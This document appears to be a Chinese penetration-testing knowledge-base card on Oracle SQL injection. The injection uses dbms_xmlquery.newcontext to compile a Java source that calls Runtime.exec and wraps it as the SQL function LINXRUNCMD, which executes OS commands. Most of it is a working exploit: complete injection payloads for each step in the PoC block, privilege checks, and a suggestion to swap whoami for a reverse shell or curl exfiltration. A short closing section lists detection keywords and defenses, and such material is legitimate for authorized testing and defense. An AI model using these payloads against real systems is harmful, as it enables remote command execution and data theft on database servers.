---
id: web-generic-sqli-oracle-dbms-xmlquery-java-source-command-exec
title: Oracle 注入借 dbms_xmlquery.newcontext 编译 Java Source：创建 LINXRUNCMD 函数后以数据库权限执行系统命令
type: scenario
domain: web
path: web/generic/sqli
technique: oracle-sqli-dbms-xmlquery-java-source-command-exec
tags:
- oracle
- sql-injection
- rce
- java-source
- dbms_xmlquery
- plsql
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:21:03+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文。原文 flag2 给出六段 SQL：create java source LinxUtil（Runtime.getRuntime().exec）、sys.dbms_cdc_publish.create_change_set 提权、create function LINXRUNCMD language java、查 all_objects、union select LINXRUNCMD(whoami)，全部以 admin 拼接注入，卡片 PoC 与之一致；原文自述该链「非常非常卡」。注入点/参数为靶场实例，未复现。原文未声明 Oracle 版本。
url: /docs/web/generic/sqli/web-generic-sqli-oracle-dbms-xmlquery-java-source-command-exec/
draft: false
kb_aliases:
- dbms_xmlquery.newcontext 命令执行
- Oracle Java Source 提权
- CREATE AND COMPILE JAVA SOURCE
- LINXRUNCMD
- Oracle 注入 getshell
---

## 一句话结论

Oracle 账号若具备 `CREATE PROCEDURE`/`CREATE JAVA SOURCE` 权限，SQL 注入就不止读数据：用 `dbms_xmlquery.newcontext()` 把一段 `create or replace and compile java source` 当 PL/SQL 动态执行，注册出调用 `Runtime.getRuntime().exec()` 的 `LinxUtil.runCMD`，再用 `create or replace function LINXRUNCMD ... language java` 包成 SQL 函数，之后 `select LINXRUNCMD('whoami') from dual` 就变成以 Oracle 进程用户（常为 `oracle`）执行任意系统命令。

## 原理

- **注入点只是入口**：`admin' and (select dbms_xmlquery.newcontext('...') from dual)>1 --` 把注入从「读数据」升级为「执行 PL/SQL」；`dbms_xmlquery.newcontext` 会把传入字符串当查询上下文解析，配合 `PRAGMA AUTONOMOUS_TRANSACTION` 可在注入语句内部独立提交 DDL。
- **Java Source 是 Oracle 自带的执行面**：Oracle JVM 内嵌在数据库中，`create or replace and compile java source named "X" as ...` 会把 Java 源码编译进库；只要账号有相应权限，就能定义带 `Runtime.exec` 的静态方法。
- **SQL 函数包装**：`create or replace function F(p_cmd in varchar2) return varchar2 as language java name 'LinxUtil.runCMD(java.lang.String) return String'` 建立 SQL→Java 的映射，此后普通 `select` 即可调用，返回命令输出，便于在注入回显中直接读到结果。
- **为什么绕得开**：注入点原本只允许 `select`，通过 `newcontext` 里的 `execute immediate` 完成 DDL 与提权（`sys.dbms_cdc_publish.create_change_set` 只是原链里用来提权的辅助调用），整个过程不依赖任何数据库外的组件。
- **权限边界**：需要 `CREATE PROCEDURE`/`CREATE ANY PROCEDURE`、`CREATE JAVA SOURCE` 类权限；普通只读账号走不通，但业务库常见的「应用账号」往往拥有建对象权限。

## 触发条件

- 存在 Oracle 后端 SQL 注入点（本例为登录处 `admin' ... --` 且可布尔/可执行）。
- 注入所用数据库账号有创建存储过程/Java Source 的权限，`dbms_xmlquery` 未被回收。
- 数据库允许出站或被用于本地命令执行（Oracle JVM 启用）。
- 需要能观察到命令输出（注入点回显或盲注侧信道）。

## 利用步骤

1. 确认注入与权限：`admin' and 1=(select 1 from dual where (select count(*) from user_sys_privs where privilege like '%JAVA%')>0) --`。
2. 编译 Java Source：提交含 `create or replace and compile java source named "LinxUtil" as ...` 的 `dbms_xmlquery.newcontext(...)` 注入，方法体内用 `Runtime.getRuntime().exec(args)` 并把 stdout 拼成字符串返回。
3. 创建 SQL 函数：`create or replace function LINXRUNCMD(p_cmd in varchar2) return varchar2 as language java name 'LinxUtil.runCMD(java.lang.String) return String';`。
4. 校验对象存在：`select object_name from all_objects where object_name='LINXRUNCMD'`。
5. 执行命令：`admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--`；把 `whoami` 换成反弹 shell 或用 `curl` 外带。

## PoC

```sql
-- 1. 编译 Java Source（经 dbms_xmlquery 动态执行）
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;
begin execute immediate ''create or replace and compile java source named "LinxUtil" as
import java.io.*;
public class LinxUtil {
  public static String runCMD(String args){
    try{
      BufferedReader r = new BufferedReader(new InputStreamReader(
        Runtime.getRuntime().exec(args).getInputStream()));
      String s, out="";
      while((s=r.readLine())!=null) out += s+"\n";
      r.close(); return out;
    }catch(Exception e){return e.toString();}
  }
}'';commit;end;') from dual)>1 --

-- 2. 建立 SQL 到 Java 的映射
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;
begin execute immediate ''create or replace function LINXRUNCMD(p_cmd in varchar2)
return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String'''';'';
commit;end;') from dual)>1--

-- 3. 执行命令并回显
admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--
```

## 变体与关联

- **其它 Oracle 执行面**：`dbms_java` 授权 + `Runtime.exec`、`dbms_scheduler` 建外部作业、`utl_http` 出网外带；本质都是「用注入拿到的建对象权限换取宿主命令执行」。
- **数据库提权链**：`sys.dbms_cdc_publish.create_change_set` 一类系统包被用来抬高当前账号权限（原链第 2 步即此目的）。
- **其它数据库的同类**：MSSQL CLR 程序集（[[pentest-privilege-escalation-mssql-sharpsqltools-clr-efspotato]]）、PostgreSQL `COPY TO PROGRAM`（[[web-generic-sqli-postgres-copy-to-program-rce]]）、MySQL UDF/`INTO OUTFILE`。

## 检测与防御

- **检测**：审计日志中出现 `dbms_xmlquery`、`create and compile java source`、`language java` 等关键字；数据库账号在短时间内的 DDL 行为（建 Java Source/函数）；Oracle 进程派生出 `sh`/`cmd.exe` 子进程（`ps -ef` 中 `oracle` 用户的异常子进程）。
- **防御**：应用连接账号只授予必要 DML，禁止 `CREATE PROCEDURE`/`CREATE JAVA SOURCE`/`CREATE ANY PROCEDURE`；回收 `dbms_xmlquery`、`dbms_java`、`utl_http` 等高风险包的执行权限；参数化查询消除注入点；对数据库账号做行为基线告警。
